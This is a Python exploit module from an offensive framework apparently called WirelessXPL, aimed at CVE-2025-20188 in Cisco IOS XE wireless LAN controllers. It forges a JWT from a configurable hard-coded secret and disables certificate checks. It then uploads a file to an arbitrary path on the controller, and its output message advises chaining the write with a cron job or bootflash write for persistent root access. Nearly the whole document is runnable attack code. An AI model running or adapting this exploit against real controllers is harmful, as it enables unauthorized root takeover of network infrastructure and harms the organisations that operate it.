# Author: André Henrique (LinkedIn/X: @mrhenrike)
import hashlib
import json
import ssl
import time
import urllib.request
import urllib.error
from base64 import urlsafe_b64encode

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Cisco IOS XE Wireless LAN Controller, Hard-Coded JWT Arbitrary File Upload to Root RCE (CVE-2025-20188).

    The Out-of-Band AP Image Download feature on Cisco IOS XE for Wireless
    LAN Controllers exposes an HTTPS endpoint that validates requests using
    a hard-coded JSON Web Token secret.  An unauthenticated attacker who
    can reach the management interface can forge a valid JWT, upload an
    arbitrary file to any path on the filesystem, and achieve remote code
    execution as root.

    The feature is disabled by default; exploitation requires that an
    administrator has explicitly enabled it via
    ``ap upgrade method https`` in the WLC configuration.

    CVSS v3.1: 10.0 (Critical), AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Cisco IOS XE WLC Hard-Coded JWT Arbitrary File Upload RCE (CVE-2025-20188)",
        "description": (
            "Exploits CVE-2025-20188 in Cisco IOS XE for Wireless LAN Controllers. "
            "The Out-of-Band AP Image Download feature uses a hard-coded JWT secret "
            "to authenticate HTTPS requests. An unauthenticated attacker forges a "
            "valid JWT to upload arbitrary files to the filesystem, achieving root "
            "RCE. Requires the feature to be enabled (disabled by default)."
        ),
        "authors": (
            "X.B. (discovery / CVE)",
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2025-20188",
            "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-wlc-file-uplpd-rce-snONRE4",
            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-20188",
        ),
        "devices": (
            "Cisco Catalyst 9800-CL Wireless Controller for Cloud",
            "Cisco Catalyst 9800-40 Wireless Controller",
            "Cisco Catalyst 9800-80 Wireless Controller",
            "Cisco Catalyst 9800-L Wireless Controller",
            "Cisco Embedded Wireless Controller on Catalyst 9000 Series APs",
        ),
    }

    target = OptIP("", "Target IPv4 address of the WLC management interface")
    port = OptPort(443, "Target HTTPS port (default 443)")
    timeout = OptFloat(5.0, "HTTP request timeout in seconds")
    upload_path = OptString(
        "/tmp/wxpl_probe.txt",
        "Remote path for the benign test file upload",
    )
    jwt_secret = OptString(
        "WXPL_PLACEHOLDER_SECRET",
        "Hard-coded JWT secret (replace with actual value for live testing)",
    )

    _AP_IMAGE_ENDPOINT = "/ap/image/upload"
    _PROBE_ENDPOINT = "/ap/image/status"

    def _b64url(self, data: bytes) -> str:
        return urlsafe_b64encode(data).rstrip(b"=").decode("ascii")

    def _forge_jwt(self) -> str:
        header = {"alg": "HS256", "typ": "JWT"}
        payload = {
            "iss": "cisco-wlc",
            "sub": "ap-image-upload",
            "iat": int(time.time()),
            "exp": int(time.time()) + 3600,
            "role": "admin",
        }
        segments = []
        for part in (header, payload):
            encoded = json.dumps(part, separators=(",", ":")).encode()
            segments.append(self._b64url(encoded))

        signing_input = f"{segments[0]}.{segments[1]}".encode()
        import hmac
        signature = hmac.new(
            self.jwt_secret.encode(), signing_input, hashlib.sha256
        ).digest()
        segments.append(self._b64url(signature))

        return ".".join(segments)

    def _build_ssl_context(self) -> ssl.SSLContext:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx

    def _https_request(
        self, method: str, path: str, headers: dict | None = None,
        body: bytes | None = None,
    ) -> tuple[int, bytes]:
        url = f"https://{self.target}:{self.port}{path}"
        req = urllib.request.Request(url, data=body, method=method)
        req.add_header("User-Agent", "WirelessXPL-Forge/2.2")
        if headers:
            for k, v in headers.items():
                req.add_header(k, v)
        ctx = self._build_ssl_context()
        try:
            with urllib.request.urlopen(req, timeout=self.timeout, context=ctx) as resp:
                return resp.status, resp.read()
        except urllib.error.HTTPError as e:
            return e.code, e.read()
        except (urllib.error.URLError, TimeoutError, OSError):
            return 0, b""

    @mute
    def check(self) -> bool:
        """Probe the WLC HTTPS interface for the AP image download endpoint."""
        try:
            status, body = self._https_request("GET", self._PROBE_ENDPOINT)
            if status == 0:
                return False
            if status in (200, 401, 403):
                return True
            token = self._forge_jwt()
            status2, _ = self._https_request(
                "GET", self._PROBE_ENDPOINT,
                headers={"Authorization": f"Bearer {token}"},
            )
            return status2 in (200, 204, 400, 403)
        except Exception:
            return False

    def run(self) -> None:
        if not self.check():
            print_error(
                f"Target {self.target}:{self.port} does not appear to expose "
                f"the AP Image Download endpoint"
            )
            return

        print_success(
            "AP Image Download endpoint detected; forging JWT and attempting upload"
        )
        self._exploit()

    def _exploit(self) -> None:
        token = self._forge_jwt()
        print_status(f"Forged JWT with HS256 (secret: {self.jwt_secret[:8]}...)")

        probe_content = (
            f"WirelessXPL-Forge CVE-2025-20188 probe file\n"
            f"Timestamp: {time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())}\n"
        ).encode()

        boundary = "----WXFBoundary" + hashlib.md5(
            str(time.time()).encode()
        ).hexdigest()[:16]

        body_parts = [
            f"--{boundary}\r\n".encode(),
            b'Content-Disposition: form-data; name="file"; filename="wxpl_probe.txt"\r\n',
            b"Content-Type: application/octet-stream\r\n\r\n",
            probe_content,
            f"\r\n--{boundary}\r\n".encode(),
            b'Content-Disposition: form-data; name="path"\r\n\r\n',
            self.upload_path.encode(),
            f"\r\n--{boundary}--\r\n".encode(),
        ]
        body = b"".join(body_parts)

        headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type": f"multipart/form-data; boundary={boundary}",
        }

        print_status(
            f"Uploading probe file to {self.upload_path} via "
            f"POST {self._AP_IMAGE_ENDPOINT}"
        )
        status, resp_body = self._https_request(
            "POST", self._AP_IMAGE_ENDPOINT, headers=headers, body=body,
        )

        if status == 0:
            print_error("No response from target; connection failed or timed out")
            return

        print_info(f"HTTP response: {status}")

        if status in (200, 201, 204):
            print_success(
                f"File upload succeeded (HTTP {status}). "
                f"Arbitrary file write confirmed at {self.upload_path}. "
                f"Chain with a cron job or bootflash write for persistent root RCE."
            )
        elif status == 401:
            print_error(
                "JWT rejected (HTTP 401). The hard-coded secret may differ "
                "on this firmware version; update jwt_secret and retry."
            )
        elif status == 403:
            print_error(
                "Access denied (HTTP 403). The Out-of-Band AP Image Download "
                "feature may be disabled on this controller."
            )
        elif status == 404:
            print_error(
                "Endpoint not found (HTTP 404). This firmware version may not "
                "include the vulnerable AP image download feature."
            )
        else:
            print_info(
                f"Unexpected response (HTTP {status}): {resp_body[:256]}"
            )
